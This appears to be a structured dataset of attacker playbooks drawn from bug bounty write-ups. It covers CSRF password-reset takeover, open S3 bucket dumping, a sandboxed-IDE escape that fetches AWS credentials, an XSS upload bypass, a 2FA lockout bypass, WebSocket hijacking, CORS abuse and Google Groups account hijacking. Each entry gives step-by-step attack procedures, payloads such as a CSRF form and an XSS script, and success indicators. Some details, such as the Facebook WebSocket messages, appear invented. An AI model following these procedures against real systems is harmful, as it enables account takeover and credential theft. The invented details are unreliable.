playbooks.impact: An attacker can perform any state-changing action on behalf of an authenticated user without their explicit consent, by tricking them into visiting a malicious link. This could lead to unauthorized modification of user data, account settings, or other sensitive operations.
playbooks.key_lesson: Always validate the `Content-Type` header strictly for JSON payloads; do not implicitly trust that a non-JSON `Content-Type` will prevent CSRF if the application can parse form-urlencoded data.

meta.title: How I Made $600 in Bug Bounty in 15 Minutes with Contrast CE – CVE- 2019-8442

prerequisites: Contrast Community Edition (CE) installed and configured
Contrast CE agent successfully connected to the target JIRA Server instance
applicability_signals: JIRA Server Web Application visible in Contrast CE
Vulnerability identified by Contrast CE with a tainted sink in a URL pattern like 'download/contextbatch/js/atl.dashboard,jira.global,atl.general,-_super/batch.js'
skip_if: Contrast CE agent not connected
No vulnerabilities reported by Contrast CE on the JIRA Server

recon_steps: Step 1: Install and configure Contrast Community Edition (CE) by registering for a free account and downloading the Java agent.
Step 2: Follow setup instructions for Atlassian JIRA Server.
Step 3: Connect the Contrast CE agent to the JIRA Server by setting the CATALINA_OPTS JVM environment variable in the 'start-jira.sh' script with the path to the agent JAR file.
Step 4: Verify the connection by checking Contrast CE for the JIRA Server Web Application.
attack_steps: Step 1: Once the Contrast CE agent is connected, navigate to the JIRA Server Web Application within Contrast CE.

Step 2: Observe the vulnerabilities reported by Contrast CE, specifically looking for entries that indicate a 'tainted sink' within a JavaScript batch file URL (e.g., 'download/contextbatch/js/atl.dashboard,jira.global,atl.general,-_super/batch.js').
Step 3: Click on the 'HTTP Info' tab for the identified vulnerability.
Step 4: Replay the request associated with the vulnerability. (Further steps for exploitation are not detailed in the writeup).
tools_recommended: Contrast Community Edition (CE)
Atlassian JIRA Server
success_indicators: Contrast CE reporting a vulnerability with a tainted sink in the specified URL pattern.
Observation of HTTP Info and the ability to replay the request.
failure_indicators: Contrast CE not reporting any vulnerabilities on the JIRA Server.
Inability to connect the Contrast CE agent to JIRA Server.
No vulnerable 'tainted sink' patterns observed in the reported vulnerabilities.

playbooks.impact: The writeup states that $600 was made in bug bounty, implying the identified vulnerability was exploitable and awarded. The specific impact of the vulnerability itself (e.g., what information was disclosed or what actions could be performed) is not detailed beyond the mention of a 'tainted sink'.
playbooks.key_lesson: When using application security testing tools like Contrast CE, pay close attention to reported vulnerabilities, especially those indicating 'tainted sinks' within JavaScript batch files, as these can point to exploitable information disclosure or other security weaknesses.

meta.title: Using CSRF I Got Weird Account Takeover

trigger_conditions.when_to_apply: When the password reset functionality does not properly validate or expire reset tokens, and the token is included in a predictable way that can be leveraged by CSRF.
prerequisites: Attacker needs to have an account or know the email of a victim.
applicability_signals: Password reset functionality exists.
CSRF token is present in the password reset request.
Removing or manipulating the CSRF token does not prevent the password reset.
Password reset tokens appear to be session-bound or have a long expiration if not used immediately.
skip_if: Password reset requests always fail with an invalid CSRF token.
Password reset tokens are invalidated immediately after being sent or used.

recon_steps: Step 1: Enumerate subdomains using tools like Sublist3r to identify potential targets.
Step 2: Identify and interact with the password reset functionality on the target subdomain.
Step 3: Intercept password reset requests using a proxy (e.g., Burp Suite) to analyze parameters and tokens.
attack_steps: Step 1: Initiate a password reset for the attacker's own account and observe the request in the proxy. Note the presence and format of any CSRF token.
Step 2: Attempt to remove or manipulate the CSRF token in the observed password reset request and resend it. Observe the server's response to determine if the token is validated.
Step 3: If the token is not validated, send a password reset request for a victim's account.
Step 4: Analyze the password reset link sent to the victim. If the link contains a token that is not immediately invalidated, proceed with CSRF.
Step 5: Craft a CSRF payload (e.g., an HTML form) that submits the password reset request with the observed token and a new password for the victim's account.
Step 6: Host the CSRF payload on a domain controlled by the attacker.
Step 7: Trick the victim into visiting the attacker's hosted page, which will submit the forged password reset request to the target application.
Step 8: If successful, the attacker will gain account takeover.
payloads_or_patterns: <form action="<TARGET_URL>/password-reset-endpoint" method="POST"><input type="hidden" name="token" value="<OBSERVED_RESET_TOKEN>"><input type="hidden" name="email" value="<VICTIM_EMAIL>"><input type="password" name="new_password" value="<ATTACKER_CONTROLLED_PASSWORD>"><button type="submit">Reset</button></form>
tools_recommended: Burp Suite: For intercepting and manipulating HTTP requests.
Sublist3r: For subdomain enumeration.
A web server (e.g., Python's http.server): To host the CSRF payload.
success_indicators: The attacker can log in to the victim's account using the new password.
The server's response indicates a successful password change for the victim's account, even when the CSRF token is missing or manipulated.
failure_indicators: All password reset requests are rejected with a 403 status code when the CSRF token is manipulated or absent (indicates proper CSRF protection).
The password reset token expires immediately after generation or being sent, preventing CSRF.
The server requires the current password to be provided during the reset process, which the attacker would not know.

playbooks.impact: Account takeover of the victim's account, allowing the attacker to access sensitive information, perform actions on behalf of the victim, or further compromise the account.
playbooks.key_lesson: Always validate CSRF tokens on sensitive operations like password resets, and ensure that password reset tokens have a short, strict expiration policy and are invalidated immediately after use.

meta.title: How, I dumped crypto data by chaining directory listing to open S3 Bucket

trigger_conditions.when_to_apply: When a subdomain or associated domain exhibits directory listing vulnerability and serves content originating from an S3 bucket.
prerequisites: Directory listing vulnerability found on a web application.
The web application is serving content from an S3 bucket.
applicability_signals: The domain name pattern matches a typical S3 bucket structure (e.g., <bucket-name>-<region>.s3.<region>.amazonaws.com).
The content listed in the directory traversal is also accessible directly via the S3 URL.
skip_if: The S3 bucket is not publicly accessible.
The web application performs strict content validation that prevents direct access to S3 objects.

recon_steps: Step 1: Use Amass or other subdomain enumeration tools to discover subdomains associated with the target.
Step 2: Browse discovered subdomains for directory listing vulnerabilities.
Step 3: Identify if the content served by the vulnerable subdomain originates from an S3 bucket by inspecting response headers or URLs.
attack_steps: Step 1: Upon discovering a subdomain like 'dbXXX.xyz.org/' that lists directories and appears to serve content from an S3 bucket (e.g., 'XXXXX-dbXXX-public.s3.eu-central-1.amazonaws.com'), directly access the S3 bucket URL.
Step 2: Verify if the S3 bucket is publicly accessible by browsing its contents.
Step 3: If the bucket is public, use AWS CLI commands to list, download, delete, or move files within the bucket.
Step 4: Extract sensitive information from downloaded files, such as database configuration files.
tools_recommended: Amass for subdomain enumeration.
curl or wget for testing direct S3 URL access.
AWS CLI for interacting with S3 buckets.
success_indicators: Successful listing of bucket contents using `aws s3 ls`.
Ability to download sensitive files (e.g., database configuration, credentials) using `aws s3 cp`.
Response 200 OK when directly accessing the S3 bucket URL.
Extraction of sensitive data (e.g., DB credentials, internal configurations) from downloaded files.
failure_indicators: 403 Forbidden or 404 Not Found when accessing the S3 bucket URL directly (indicates bucket is not public).
AWS CLI commands failing with permission errors (indicates restricted access).
Directory listing on the web app exists, but no corresponding S3 bucket is identified or accessible.

playbooks.impact: Disclosure of sensitive data, including database configuration files containing credentials, version details, and table structures. This can lead to further exploitation such as database compromise, unauthorized access, and data breaches.
playbooks.key_lesson: Always investigate the origin of content served by a web application, especially when directory listing vulnerabilities are found. Publicly accessible S3 buckets can lead to significant data disclosure if not properly secured with restrictive ACLs.

Execution of arbitrary code on the target's machine.

meta.title: Responsible Disclosure: Breaking out of a Sandboxed Editor to perform RCE

target_profile.technology: Theia IDE (VS Code based online IDE)

trigger_conditions.when_to_apply: When a sandboxed online IDE environment is exposed and allows execution of arbitrary code or commands within its sandbox.
prerequisites: Access to the sandboxed online IDE.
applicability_signals: The IDE has a global action menu (e.g., Ctrl/Cmd + Shift + P).
The 'Task: Run selected text' option is available or can be triggered.
The IDE environment is hosted on AWS infrastructure.
skip_if: No terminal access can be gained.
The target environment is not hosted on AWS or metadata service is inaccessible.

recon_steps: Step 1: Navigate to the HackerEarth online IDE URL (e.g., https://[REDACTED]/#/home/node/he-theia/sandbox) to identify the technology.
Step 2: Inspect HTTP responses for headers or content that confirm the use of Theia IDE or VS Code based environments.
attack_steps: Step 1: Open the global action menu in the IDE (Ctrl/Cmd + Shift + P).
Step 2: Select or trigger the 'Task: Run selected text' option.
Step 3: If terminal access is gained, attempt to read system configuration files like SSL certificates.
Step 4: Investigate environment variables for AWS metadata URIs.
Step 5: If ECS_CONTAINER_METADATA_URI and AWS_CONTAINER_CREDENTIALS_RELATIVE_URI are found, use curl to fetch AWS credentials.
payloads_or_patterns: Global action menu shortcut (Ctrl/Cmd + Shift + P)
tools_recommended: Burp Suite (for intercepting requests and analyzing responses)
Built-in IDE terminal
success_indicators: Successful execution of commands in the IDE's terminal.
Ability to read sensitive system files (e.g., .crt, .key files).
Successful retrieval of AWS credentials via the metadata service.
failure_indicators: Inability to trigger 'Task: Run selected text' or gain terminal access (e.g., option is removed or disabled). Pivot to looking for other vulnerabilities in the IDE or application.
Metadata service is inaccessible (e.g., returns connection refused or timeout). Pivot to exploring other AWS services or configurations.

playbooks.impact: Remote Code Execution on the server hosting the IDE, allowing access to sensitive files including SSL certificates, git history, and potentially AWS credentials, leading to full compromise of the affected instance and associated AWS resources.
playbooks.key_lesson: Always investigate the capabilities of sandboxed environments, especially online IDEs, for command execution or file access vulnerabilities, and check for exposed AWS metadata services when targeting cloud-hosted applications.

meta.title: Tumblr Bug Bounty ($200)

trigger_conditions.when_to_apply: When the target allows theme asset uploads and doesn't strictly validate file types or content, or when email following features are present and don't enforce verification for certain actions.
prerequisites: Attacker must have an authenticated Tumblr account.
applicability_signals: Endpoints related to theme asset uploads.
Functionality for adding/managing email followers.
The ability to search blogs by email address.
skip_if: File upload endpoint rejects all non-whitelisted file types.
Email following requires immediate verification before any blog interaction.

recon_steps: Identify the theme asset upload endpoint and its accepted file types.
Explore the email following functionality and check for any email verification steps.
Investigate if there's a way to search or discover blogs associated with specific email addresses.
attack_steps: Step 1: Attempt to upload a file with a `.json` extension containing HTML/JavaScript code (e.g., `<script>alert(document.domain)</script>`).
Step 2: If direct `.json` upload fails, try a double extension like `.json.html` to bypass file type restrictions.
Step 3: Once a malicious file is uploaded, navigate to its URL to trigger the JavaScript.
Step 4: Create a Tumblr blog using an email address associated with the victim's domain.

Step 5: When other users search for the victim's domain email, they should see the attacker's blog, potentially leading to social engineering or credential harvesting if the attacker's blog mimics a legitimate service.
payloads_or_patterns: For File Upload: `{"code": "<script>alert(document.domain)</script>"}` saved as `malicious.json` or `malicious.json.html`

For Open Redirect/Email Enumeration: Create a Tumblr blog with a name that tricks users searching for a victim's email (e.g., if victim's email is `user@victim.com`, create a blog that appears legitimate when `user@victim.com` is searched).
tools_recommended: Burp Suite: For intercepting and modifying file uploads, and for testing different file extensions.
A simple text editor: To craft the malicious JSON or HTML content.
success_indicators: For File Upload: Successful upload of a `.json` or `.json.html` file. An alert box appearing when navigating to the uploaded file's URL.
For Open Redirect/Email Enumeration: When a user searches for a victim's email address, the attacker's crafted blog appears in the search results.
failure_indicators: For File Upload: Upload rejection due to file type or content filtering. No alert box appearing. Pivot: Try different file extensions or encoding techniques.

For Open Redirect/Email Enumeration: Victim's email search results do not display the attacker's blog. Pivot: Re-evaluate blog naming strategy or if the search functionality is truly susceptible to this type of manipulation.

playbooks.impact: For the file upload vulnerability, an attacker can execute arbitrary JavaScript in the context of users viewing the uploaded file, leading to XSS. For the email enumeration, an attacker can potentially trick users into interacting with their blog, leading to phishing or social engineering.
playbooks.key_lesson: Always test file upload functionalities for bypasses using alternative extensions or by embedding malicious content within seemingly benign file types like JSON.

meta.title: Disclose Full Admin List of any Facebook Applications

trigger_conditions.when_to_apply: This technique is applicable when an authenticated user can interact with a Facebook application's administrative features without proper authorization checks.
prerequisites: Attacker must have an authenticated Facebook account.
applicability_signals: Presence of any Facebook application that the attacker is part of or can interact with.
skip_if: If the application thoroughly checks for administrative privileges before revealing the admin list.

recon_steps: Step 1: Identify a Facebook application that the attacker has some level of access to (e.g., as a developer, tester, or user with specific roles).
Step 2: Analyze the application's endpoints and network traffic to find any API calls related to managing application settings or users.
attack_steps: Step 1: Attempt to access endpoints that might reveal the list of administrators for the Facebook application.
Step 2: If the initial attempt fails, try different HTTP methods (GET, POST) or manipulate common parameters associated with user or application management.
Step 3: Observe the response for any data that includes user identifiers or email addresses of individuals associated with administrative roles.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, analyze responses, and identify potential API endpoints.
Facebook Graph API Explorer: To understand the structure of Facebook's API and experiment with queries.
success_indicators: Receiving a 200 OK response that contains a JSON list of user IDs, names, and email addresses, indicating the administrators of the target Facebook application.
The response explicitly lists users with administrative privileges.
failure_indicators: Receiving a 403 Forbidden or 401 Unauthorized response, indicating insufficient privileges.
Receiving a 404 Not Found response, suggesting the endpoint does not exist or is not accessible.
The response contains no discernible user information or an empty list.
If failure occurs, investigate alternative methods of enumerating users or checking for other IDOR vulnerabilities within the application's settings.

playbooks.impact: An attacker can obtain a full list of administrators for any Facebook application, potentially revealing sensitive information about the application's owners or operators and enabling further targeted attacks.
playbooks.key_lesson: Always validate authorization before returning sensitive application metadata such as administrator lists, even for endpoints that appear to be internal or related to application management.

meta.title: 2FA Bypass via Logical Rate Limiting Bypass

tech_stack_fingerprints: medium.com domain (for the writeup context, actual target tech stack not specified)

trigger_conditions.when_to_apply: When a web application implements 2FA with a brute-force protection that locks the account after a certain number of attempts, and the 'Unlock Account' functionality is not rate-limited.
prerequisites: Target application has a 2FA mechanism.
Attacker has valid user credentials.
Target application provides an 'Unlock Account' functionality.
Attacker can access the victim's email inbox (or has programmatic access to it, e.g., via API).
applicability_signals: Account lockout after 10 incorrect 2FA attempts.
'Unlock Account' link is sent to the user's email.
The 'Unlock Account' functionality does not appear to be rate-limited.
skip_if: 2FA brute-force attempts are effectively rate-limited to prevent exploitation.
The 'Unlock Account' functionality is also rate-limited.
Programmatic access to the victim's email is not possible.

recon_steps: Step 1: Log in with valid user credentials to reach the 2FA page.
Step 2: Attempt to brute-force the 2FA code until the account is locked.
Step 3: Observe the 'Unlock Account' functionality and its associated email sending mechanism.
Step 4: Investigate if the 'Unlock Account' request is rate-limited by sending multiple requests in quick succession.
attack_steps: Step 1: Initiate the 'Unlock Account' process to receive the unlock link.
Step 2: While waiting for the unlock email, submit valid victim credentials to the login page (as there is no rate limit).
Step 3: Attempt to randomly guess the 2FA code up to the lockout limit (e.g., 10 attempts).
Step 4: Read the victim's email inbox to retrieve the 'Unlock Account' link.
Step 5: Use the retrieved 'Unlock Account' link to unlock the account.
Step 6: Repeat steps 2-5, attempting to guess the 2FA code after unlocking, until the correct code is found. This can be scripted by automating the email retrieval and link clicking.
tools_recommended: Custom script (e.g., Python) to automate login, 2FA guessing, email retrieval (using Gmail API or similar), and account unlocking.
Burp Suite to observe network traffic and identify endpoints.
success_indicators: Successful login after multiple incorrect 2FA attempts have been made and the account has been unlocked.
The attacker is able to bypass the 2FA protection without knowing the actual 2FA code.
failure_indicators: The 'Unlock Account' functionality is rate-limited, preventing repeated requests.
The unlock token expires quickly or requires additional verification.
The attacker cannot access the victim's email inbox.
Response to 2FA attempts after unlock shows the same lockout behavior without the code being guessed.

playbooks.impact: Attacker can bypass Two-Factor Authentication for any user, gaining unauthorized access to their accounts and potentially all associated data and actions.
playbooks.key_lesson: Always apply rate limiting to account unlocking mechanisms, especially when they are used to bypass other security controls like 2FA.

meta.title: Improper Input Validation | Add Custom Text and URLs In SMS send by Snapchat

trigger_conditions.when_to_apply: When a web application provides a mechanism to send SMS messages to a user's phone number, and these messages can contain parameters that are reflected in the SMS content.
prerequisites: Ability to trigger the SMS sending functionality (e.g., by providing a phone number).
applicability_signals: A URL endpoint that accepts a phone number and sends an SMS.
The presence of a parameter in the request that is also present in the SMS content (e.g., 'cid=' parameter reflected in the SMS).
skip_if: The SMS sending functionality is not available.
All parameters passed in the request are properly sanitized and do not reflect in the SMS content.

recon_steps: Step 1: Navigate to https://whatis.snapchat.com/ and locate the 'Send Link' option for downloading the app.
Step 2: Observe the POST request made when sending the link to a phone number using browser developer tools (e.g., Burp Suite, Chrome DevTools).
attack_steps: Step 1: Trigger the SMS sending functionality by providing a valid phone number on https://whatis.snapchat.com/.
Step 2: Intercept the HTTP POST request made to app.snapchat.com/stories_everywhere/download_sms.
Step 3: Identify parameters within the request that appear to be reflected in the SMS content (e.g., 'cid=').
Step 4: Modify the value of the identified parameter by appending custom text and URLs. Use '+' to replace spaces.
Step 5: Resend the modified request.
Step 6: Check the received SMS on the target phone for the injected custom text and URLs.
tools_recommended: Burp Suite (for intercepting and modifying requests)
Browser Developer Tools
success_indicators: The received SMS contains the custom text and URLs that were injected into the 'cid=' parameter.
failure_indicators: The SMS is sent but does not contain the injected custom text and URLs. This might indicate proper sanitization or a different reflection mechanism. Pivot to testing other parameters or different SMS sending features if available.

playbooks.impact: An attacker can inject arbitrary text and URLs into SMS messages sent by the application. This could be used for phishing, distributing malicious links, or spreading misinformation.
playbooks.key_lesson: Always test parameters in requests that trigger outbound communication (like SMS or email) to see if they are reflected in the content, as improper input validation can lead to message injection.

meta.title: Cross-Site Websocket Hijacking bug in Facebook that leads to account takeover

trigger_conditions.when_to_apply: When a web application, potentially integrated with Facebook, uses WebSockets for real-time communication and lacks proper origin validation for incoming WebSocket connections.
prerequisites: Attacker can control a third-party website or a compromised website that the victim visits.
The target application uses WebSockets and allows connections from arbitrary origins, or has a vulnerability in its origin validation.
applicability_signals: Observed WebSocket connections in network traffic
Endpoints that handle WebSocket upgrades
References to `ws://` or `wss://` in application code or network requests
skip_if: All WebSocket connections are strictly validated against specific origins.
The target application does not use WebSockets for sensitive operations.

recon_steps: Step 1: Identify WebSocket endpoints used by the target application by inspecting network traffic in browser developer tools.
Step 2: Analyze the WebSocket communication to understand the data being exchanged and identify sensitive information or commands.
attack_steps: Step 1: On an attacker-controlled website, establish a WebSocket connection to the target Facebook WebSocket endpoint.
Step 2: Leverage the unvalidated origin to send crafted WebSocket messages that mimic legitimate user actions or commands.
Step 3: Intercept or observe the responses from the WebSocket server to extract sensitive information or confirm the execution of actions.
Step 4: If the WebSocket connection facilitates account-related actions (e.g., profile updates, message sending), exploit this to take over the user's account.
payloads_or_patterns: Establish WebSocket connection to `wss://<facebook_websocket_endpoint>` from attacker-controlled origin.

Send JSON or other structured messages that represent actions like `{"type": "update_profile", "data": {"bio": "hacked by attacker"}}` or `{"type": "send_message", "to": "<victim_id>", "content": "Your account is compromised"}`
tools_recommended: Burp Suite (or OWASP ZAP) with WebSocket testing capabilities
Custom JavaScript code to establish and manage WebSocket connections from a malicious page
success_indicators: The target application reflects attacker-sent data in its responses.
Account settings are changed without user interaction.
Messages are sent from the victim's account.
Access tokens or session cookies are leaked via WebSocket messages.
failure_indicators: WebSocket connection is refused with an origin validation error (e.g., 400 Bad Request, specific error message).
No sensitive actions can be performed via the WebSocket connection.
All WebSocket messages are ignored or rejected with permission errors.

playbooks.impact: Full account takeover of the victim's Facebook account, enabling the attacker to post content, send messages, steal data, and impersonate the user.
playbooks.key_lesson: Always validate the origin of incoming WebSocket connections to prevent Cross-Site Websocket Hijacking (CSWH) and subsequent account takeovers.

meta.title: CORS Misconfiguration leading to Private Information Disclosure

trigger_conditions.when_to_apply: When a web application's CORS policy is too permissive and allows origins that are not intended, specifically when it improperly validates subdomains.
prerequisites: The target application must be configured with CORS headers that allow cross-origin requests.
The target application's `Access-Control-Allow-Origin` header must accept origins that can be controlled by the attacker (e.g., improperly validating subdomains).
applicability_signals: Target server accepts requests with an `Origin` header.
Target server responds with `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials` headers set to permissive values.
Target server appears to validate the domain name and TLD (e.g., 'com') but neglects characters in between.
skip_if: CORS policy strictly enforces the exact `Access-Control-Allow-Origin` header without any wildcard or lenient subdomain matching.
`Access-Control-Allow-Credentials` is not set to `true`.

recon_steps: Send GET request to <TARGET_URL> with a specific Origin header, e.g., `Origin: https://xyz.private.com` and observe CORS headers in response.
Send GET request to <TARGET_URL> with a modified Origin header, e.g., `Origin: https://private.com` (removing subdomain part) and observe CORS headers.
Send GET request to <TARGET_URL> with a further modified Origin header, e.g., `Origin: https://private1com` (inserting a character) and observe CORS headers to confirm validation weakness.
attack_steps: Identify a vulnerable subdomain pattern (e.g., `private1com` is accepted as a valid Origin).
Create an attacker-controlled subdomain on a free hosting service (e.g., `privatescom.000webhostapp.com`).
Host an HTML file with JavaScript on the attacker-controlled subdomain.
The JavaScript will make an XMLHttpRequest to the target domain (`https://xyz.private.com`) with the attacker-controlled Origin header.
If successful, the response from the target will be accessible to the JavaScript on the attacker's origin.
payloads_or_patterns:
```http
GET / HTTP/1.1
Host: xyz.private.com
Origin: https://private1com
Connection: close
```
tools_recommended: Burp Suite: To intercept and modify HTTP requests, especially the `Origin` header.
Free hosting service (e.g., 000webhost): To host the malicious HTML/JavaScript payload.
success_indicators: The attacker's webpage displays the response from `https://xyz.private.com`.
The `alert(this.responseText)` in the JavaScript successfully shows sensitive information from the target's response.
failure_indicators: CORS policy rejects the request (e.g., 403 Forbidden or empty CORS headers in response). This indicates the `Access-Control-Allow-Origin` is not matching the crafted origin.
The `Access-Control-Allow-Credentials` header is missing or not set to `true`, preventing `withCredentials = true` from working to fetch cookies/auth info.

playbooks.impact: Disclosure of private user information that is returned in the response to the request made from the attacker-controlled origin.
playbooks.key_lesson: Always validate the `Origin` header strictly. Do not allow wildcards or patterns that are susceptible to subdomain bypasses. Ensure `Access-Control-Allow-Credentials` is only set to `true` when absolutely necessary for the intended origin.

meta.title: User Account Takeover via Signup Feature

trigger_conditions.when_to_apply: When a web application allows new account creation without email verification and has a 'Switch Accounts' feature that links accounts to an email address.
prerequisites: The target application has a signup form that collects user details (name, team name, email, password).
The target application has a 'Switch Accounts' feature accessible after login.
The signup feature does not require email verification.
applicability_signals: Signup process completes without email confirmation.
The 'Switch Accounts' option is visible after login.
The 'Switch Accounts' feature appears to allow switching between different 'teams' or associated accounts.
skip_if: Signup process requires email verification.
The 'Switch Accounts' feature is disabled or non-functional.
The application clearly states that one email can only be associated with one account.

recon_steps: Step 1: Navigate to the application's signup page (e.g., <TARGET_URL>/register) and observe the fields requested.
Step 2: Attempt to sign up for a new account and note if an email verification step is required.
Step 3: Log in with the newly created account and locate the 'Switch Accounts' feature.
Step 4: Research how the 'Switch Accounts' feature typically works (e.g., via Google search for 'site.com Switch Accounts').
attack_steps: Step 1: Create a new account using an email address that is already associated with an existing account on the target application.
Step 2: Upon successful signup (without verification), log in to the new account.
Step 3: Access the 'Switch Accounts' feature.
Step 4: Observe if the newly created account gains access to teams or accounts previously associated with the original email address.
payloads_or_patterns: Create new account with existing email: Name: Test User, Team Name: Test Team, Email: <EXISTING_USER_EMAIL>, Password: <any_password>
tools_recommended: Burp Suite: To intercept and analyze signup requests and observe responses.
Google Dorks: To understand the intended functionality of features like 'Switch Accounts'.
success_indicators: After switching accounts, the user can access data or features belonging to another account that shares the same email address.
The 'Switch Accounts' interface displays multiple teams/companies that were not created by the current user.
failure_indicators: Signup fails if the email address is already in use.
Signup requires email verification which prevents the attacker from proceeding.
The 'Switch Accounts' feature does not display or grant access to other accounts/teams associated with the same email.

playbooks.impact: Attacker can gain unauthorized access to any user account by simply knowing their email address, effectively performing an account takeover without needing credentials or prior authentication.
playbooks.key_lesson: Always verify if signup processes include email verification to prevent attackers from linking multiple accounts to a single email and exploiting features like 'Switch Accounts'.

meta.title: GGvulnz — How I hacked hundreds of companies through Google Groups

affected_components: Public mailing lists with 'Anyone can view content' and 'Anyone can post' permissions
Search results disclosing snippets of private emails in misconfigured groups

trigger_conditions.when_to_apply: This technique is applicable when a target organization uses Google Groups for mailing lists and those lists have permissive settings allowing public viewing and posting, or when search queries on private Google Groups reveal snippets of sensitive emails.
prerequisites: Attacker can identify a target domain using Google Workspace.
Attacker can identify a public Google Group within the target domain.
The target Google Group must have 'Anyone can view content' and 'Anyone can post' permissions enabled (Method A).
Alternatively, for Method B, search functionality on private Google Groups must reveal email snippets.
applicability_signals: Google Group URL format: https://groups.google.com/a/<domain>/forum/#!forum/$listname
Presence of green text under mailing list indicating public view access: '#XY topics last post: $DATE'
Search results for keywords on private Google Groups revealing email content snippets.
skip_if: All Google Groups are locked down and do not allow public viewing or posting.
Search functionality on private Google Groups does not reveal any email content.

recon_steps: Step 1: Identify a target organization's domain (e.g., example.com).
Step 2: Navigate to https://groups.google.com/a/<domain>/forum/ for the target domain to discover public mailing lists. Look for lists with the indicator '#XY topics last post: $DATE' (green text).

Step 3: (Method B) If no public lists are found, search for common keywords (e.g., 'password', 'reset', 'invoice') within the target domain's Google Groups instance to see if sensitive email snippets are disclosed.
attack_steps: Step 1 (Method A): For a publicly accessible mailing list, determine the list name and domain (e.g., $listname@$domain).
Step 2 (Method A): Visit the sign-up or password reset/account recovery pages of common services like Slack, Yammer, Workplace, Twitter, Facebook, or Instagram.
Step 3 (Method A): Enter the determined email address ($listname@$domain) into these services to initiate an account registration, password reset, or recovery process.
Step 4 (Method A): Check the target Google Group for an email sent by the service (e.g., Slack, Twitter) containing a confirmation link or account recovery code.
Step 5 (Method A): Click the confirmation link or use the recovery code to hijack the account associated with the fabricated email address.
Step 6 (Method B): If email snippets are found via search, analyze them for sensitive information such as credentials, personal data, or internal communications.
